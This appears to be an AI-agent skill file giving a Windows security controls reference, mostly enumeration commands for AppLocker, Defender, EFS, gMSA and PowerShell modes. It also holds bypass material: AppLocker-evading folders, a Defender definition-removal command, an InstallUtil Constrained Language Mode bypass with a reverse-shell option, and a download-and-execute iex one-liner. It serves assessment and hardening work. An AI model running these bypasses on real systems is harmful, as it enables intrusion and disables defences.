---
name: windows-security-controls
description: Windows security controls reference for AppLocker, credentials storage (SAM, LSASS, LSA, NTDS.dit), Defender, EFS, gMSA, LAPS, PowerShell constrained language mode, execution policy, SSPI, and UAC. Use this skill whenever the user needs to check, enumerate, or understand Windows security mechanisms, their configurations, or potential bypass techniques. Trigger for security assessments, hardening guidance, credential storage analysis, or when working with Windows security tools and policies.
---

# Windows Security Controls Reference

A comprehensive guide to Windows security mechanisms, their configurations, and how to enumerate them.

## AppLocker Policy

AppLocker is Microsoft's application whitelisting solution that gives administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.

### Check AppLocker Configuration

```powershell
# Get effective AppLocker policy in XML format
Get-ApplockerPolicy -Effective -xml

# Get rule collections
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Access rule collections programmatically
$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

**Registry path for AppLocker configurations:**
```
HKLM\Software\Policies\Microsoft\Windows\SrpV2
```

### AppLocker Bypass Considerations

**Writable folders that may bypass AppLocker** (if System32 or Windows directories are allowed):
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Tasks`
- `C:\windows\tracing`

**Common bypass vectors:**
- LOLBAS (Living Off The Land Binaries and Scripts) binaries
- Poorly written rules (e.g., `%OSDRIVE%*\allowed*` allows creating an `allowed` folder anywhere)
- Alternative PowerShell locations: `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`, `PowerShell_ISE.exe`
- DLL enforcement is rarely enabled due to system load
- Reflective DLL injection tools (ReflectivePick, SharpPick)

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials are stored in the SAM file with hashed passwords.

### Local Security Authority (LSA) - LSASS

LSASS stores credentials in memory for Single Sign-On purposes. It manages:
- Local security policy (password policy, user permissions)
- Authentication
- Access tokens

**LSASS checks credentials in SAM for local logins** and communicates with domain controllers for domain user authentication.

**Credentials stored in LSASS process:**
- Kerberos tickets
- NT and LM hashes
- Easily decrypted passwords

### LSA Secrets

LSA may store credentials on disk:
- Active Directory computer account password (when domain controller is unreachable)
- Windows service account passwords
- Scheduled task passwords
- IIS application passwords

### NTDS.dit

The Active Directory database, present only on Domain Controllers.

## Microsoft Defender

Microsoft Defender is the built-in antivirus in Windows 10/11 and Windows Server. It blocks common security testing tools like WinPEAS.

### Check Defender Status

```powershell
# Get Defender status
Get-MpComputerStatus

# Key value to check: RealTimeProtectionEnabled
```

**Example output:**
```
AntispywareEnabled              : True
AntivirusEnabled                : True
RealTimeProtectionEnabled       : True
```

### Defender Enumeration Commands

```powershell
# List antivirus products
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct

# Query Defender service
sc query windefend

# Remove all Defender definitions (useful for offline machines)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS uses symmetric File Encryption Keys (FEK) encrypted with the user's public key, stored in the file's $EFS alternative data stream.

### Key EFS Concepts

- **FEK**: Symmetric key for file encryption
- **Public key**: Encrypts the FEK, stored in $EFS stream
- **Private key**: Decrypts the FEK for access
- **Automatic decryption**: Occurs when copying to FAT32 or transmitting over SMB/CIFS

### Check EFS Information

```powershell
# Check if user has used EFS
# Path: C:\users\<username>\appdata\roaming\Microsoft\Protect

# Check who has access to a file
cipher /c <file>

# Encrypt all files in folder
cipher /e

# Decrypt all files in folder
cipher /d
```

### EFS Decryption Scenarios

**As Authority System:**
- Requires victim user to be running a process
- Use Meterpreter `impersonate_token` from incognito module
- Or migrate to the user's process

**With User Password:**
- Use tools like Mimikatz to decrypt EFS files

## Group Managed Service Accounts (gMSA)

gMSAs simplify service account management with automatic password rotation and enhanced security.

### gMSA Features

- **Automatic Password Management**: 240-character passwords, auto-changed per policy
- **Enhanced Security**: Immune to lockouts, no interactive logins
- **Multiple Host Support**: Shared across servers
- **Scheduled Task Capability**: Unlike regular managed service accounts
- **Simplified SPN Management**: Auto-updates with sAMaccount/DNS changes

### gMSA Password Storage

- Stored in LDAP property: `msDS-ManagedPassword`
- Auto-reset every 30 days by Domain Controllers
- Encrypted as MSDS-MANAGEDPASSWORD_BLOB
- Requires LDAPS or authenticated connection with 'Sealing & Secure'

### Read gMSA Password

```powershell
# Using GMSAPasswordReader
/GMSAPasswordReader --AccountName <accountname>
```

## LAPS (Local Administrator Password Solution)

LAPS manages local Administrator passwords with randomized, unique, regularly changed credentials stored centrally in Active Directory.

**Key points:**
- Passwords are randomized and unique per machine
- Regularly changed according to policy
- Stored in Active Directory
- Access restricted via ACLs to authorized users

## PowerShell Constrained Language Mode

Constrained Language Mode locks down PowerShell features, blocking COM objects and restricting .NET types.

### Check Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
# Values: FullLanguage or ConstrainedLanguage
```

### Bypass Methods

**Version 2 bypass (older systems):**
```powershell
Powershell -version 2
```

**PSByPassCLM tool:**
- Compile with .NET 4.5
- Add reference to `System.Management.Automation.dll`

**Direct bypass:**
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

**Reverse shell:**
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<IP> /rport=<PORT> /U c:\temp\psby.exe
```

**Alternative bypass:**
- ReflectivePick or SharpPick for reflective DLL injection

## PowerShell Execution Policy

Default execution policy is **Restricted**. Multiple bypass methods exist:

### Execution Policy Bypass Methods

```powershell
# 1. Copy and paste in interactive console
# 2. Read and Execute
Get-Content .runme.ps1 | PowerShell.exe -noprofile -

# 3. Invoke-Expression
Get-Content .runme.ps1 | Invoke-Expression

# 4. Bypass execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1

# 5. Change user execution policy
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

# 6. Change for current session
Set-ExecutionPolicy Bypass -Scope Process

# 7. Download and execute
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"

# 8. Command switch
Powershell -command "Write-Host 'message'"

# 9. Encoded command
$command = "Write-Host 'message'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

## Security Support Provider Interface (SSPI)

SSPI is the API for user authentication, negotiating authentication protocols between machines.

### Main Security Support Providers (SSPs)

| SSP | Purpose | DLL Location |
|-----|---------|-------------|
| **Kerberos** | Preferred authentication | `%windir%\System32\kerberos.dll` |
| **NTLMv1/v2** | Compatibility | `%windir%\System32\msv1_0.dll` |
| **Digest** | Web servers, LDAP (MD5 hash) | `%windir%\System32\Wdigest.dll` |
| **Schannel** | SSL/TLS | `%windir%\System32\Schannel.dll` |
| **Negotiate** | Protocol negotiation | `%windir%\System32\lsasrv.dll` |

## User Account Control (UAC)

UAC enables consent prompts for elevated activities, requiring user approval for administrative actions.

---

## Quick Reference Commands

### AppLocker
```powershell
Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Defender
```powershell
Get-MpComputerStatus
sc query windefend
```

### EFS
```powershell
cipher /c <file>
cipher /e
cipher /d
```

### PowerShell Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

### Execution Policy
```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
```

---

## Usage Notes

- **Defensive**: Use this guide to harden Windows systems, configure security controls, and audit existing policies
- **Offensive**: Use for security assessments, penetration testing, and understanding attack vectors
- **Always verify** your authorization before testing security controls on systems you don't own
- **Document findings** and provide remediation recommendations for defensive improvements
